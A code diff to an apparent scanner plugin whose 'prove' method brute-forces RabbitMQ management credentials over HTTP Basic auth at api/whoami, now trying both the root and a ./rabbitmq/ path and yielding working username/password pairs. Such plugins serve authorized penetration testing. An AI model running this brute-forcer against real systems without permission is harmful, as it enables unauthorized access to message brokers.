@@ -29,19 +29,26 @@ class Script(BaseScript):
 
     async def prove(self):
         if self.base_url:
-            url = self.base_url + 'api/whoami'
-            async with ClientSession() as session:
-                async with session.get(url=url) as res:
-                    if res and res.status == 401:
-                        async for (username, password) in self.generate_auth_dict(self.username_list, self.password_list):
-                            try:
-                                key = str(b64encode(bytes(":".join([username, password]), 'utf-8')), 'utf-8')
-                                headers = {"Authorization": 'Basic %s' % key}
-                                async with session.get(url=url, headers=headers) as res1:
-                                    if res1 and res1.status != 401:
-                                        text1 = await res1.text()
-                                        if 'Console' in text1 or (username in text1 and 'name' in text1) or 'auth_backend' in text1:
-                                            yield username + "/" + password
-                            except:
-                                pass
+            for path in self.get_url_normpath_list(self.url, [
+                    './',
+                    './rabbitmq/',
+                ]):
+                url = path + 'api/whoami'
+                async with ClientSession() as session:
+                    try:
+                        async with session.get(url=url) as res:
+                            if res and res.status == 401:
+                                async for (username, password) in self.generate_auth_dict(self.username_list, self.password_list):
+                                    try:
+                                        key = str(b64encode(bytes(":".join([username, password]), 'utf-8')), 'utf-8')
+                                        headers = {"Authorization": 'Basic %s' % key}
+                                        async with session.get(url=url, headers=headers) as res1:
+                                            if res1 and res1.status != 401:
+                                                text1 = await res1.text()
+                                                if 'Console' in text1 or (username in text1 and 'name' in text1) or 'auth_backend' in text1:
+                                                    yield username + "/" + password
+                                    except:
+                                        pass
 
+                    except:
+                        pass
